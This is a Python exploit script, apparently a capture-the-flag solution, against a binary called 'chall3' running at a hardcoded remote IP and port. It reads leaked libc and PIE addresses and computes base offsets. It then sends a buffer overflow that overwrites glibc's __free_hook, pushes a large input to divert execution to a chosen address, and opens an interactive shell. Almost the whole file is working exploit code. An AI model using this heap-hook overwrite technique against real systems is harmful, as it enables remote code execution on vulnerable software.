#!/usr/bin/python3.7
# -*- coding: utf-8 -*-
from rootkit import *

exe = context.binary = ELF('./chall3')

host = args.HOST or '3.97.113.25'
port = int(args.PORT or 9003)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --
io = start()
# io = remote('3.97.113.25', 9003)
# exe = ELF('./chall3')
libc=ELF('./libc.so.6')
io.recvuntil('OOPS!!!!I AM LEAKING CRITICAL STUFF ')
leaks = io.recvline().strip().split(b'!!')[0].split(b' ')
print(leaks)
libc_leak = int(leaks[0],0)
libc_base = libc_leak - 0x55410
libc.address = libc_base
pie_leak = int(leaks[1],0) - 0x11a2
print(hex(libc_base))
print(hex(pie_leak))

io.send(b'A'*0x28+p64(libc.sym['__free_hook']))

pause()
io.sendline('0'*0x1337 + str(pie_leak+0x00001185))
# io.interactive()

io.interactive()

